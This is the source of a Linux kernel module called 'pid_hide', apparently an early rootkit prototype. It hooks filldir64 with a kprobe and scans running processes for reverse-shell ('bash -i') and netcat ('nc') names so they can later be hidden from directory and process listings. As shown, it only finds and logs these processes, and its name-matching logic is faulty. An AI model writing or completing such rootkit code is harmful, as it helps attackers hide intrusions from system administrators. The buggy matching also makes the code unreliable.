// SPDX-License-Identifier: GPL-2.0-only
/*
 * https://github.com/torvalds/linux/blob/master/samples/kprobes/kprobe_example.c
 * https://github.com/c3l3si4n/robson
 */

#define pr_fmt(fmt) "%s: " fmt, __func__
#define HIDE_CMD1 "bash -i"
#define HIDE_CMD2 "nc"

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/pid.h>

#ifdef DEBUG
#define dbg_print(fmt, ...) pr_info(fmt, ##__VA_ARGS__)
#else
#define dbg_print(fmt, ...) /* No-op */
#endif

/* For each probe you need to allocate a kprobe structure */
static struct kprobe kp = {
	.symbol_name = "filldir64",
};

/* kprobe pre_handler: called just before the probed instruction is executed */
static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
{
	struct task_struct *task;

	// Scan all processes running in the system.
	for_each_process(task) {
		//dbg_print("Checking process: %s (PID: %d)\n", task->comm, task->pid);

		// Check if process name matches "bash -i"
		if (strncmp(task->comm, HIDE_CMD1, 10) == 0 &&
		    task->comm[10] == '\0') {
			dbg_print("Revshell process found (PID: %d)\n",
				  task->pid);

			break;
		}

		// Check if process name matches "nc"
		if (strncmp(task->comm, HIDE_CMD2, 10) == 0 &&
		    task->comm[10] == '\0') {
			dbg_print("Netcat process found (PID: %d)\n",
				  task->pid);

			break;
		}
	}
	return 0;
}

static int __init pid_hide_init(void)
{
	int ret;
	kp.pre_handler = handler_pre;

	ret = register_kprobe(&kp);
	if (ret < 0) {
		pr_err("register_kprobe failed, returned %d\n", ret);
		return ret;
	}
	dbg_print("filldir64: %px\n", kp.addr);
	return 0;
}

static void __exit pid_hide_exit(void)
{
	unregister_kprobe(&kp);
	pr_info("pid_hide exit successfully\n");
}

module_init(pid_hide_init) module_exit(pid_hide_exit)
	MODULE_AUTHOR("MikeHorn-git");
MODULE_DESCRIPTION("pid_hide");
MODULE_LICENSE("GPL");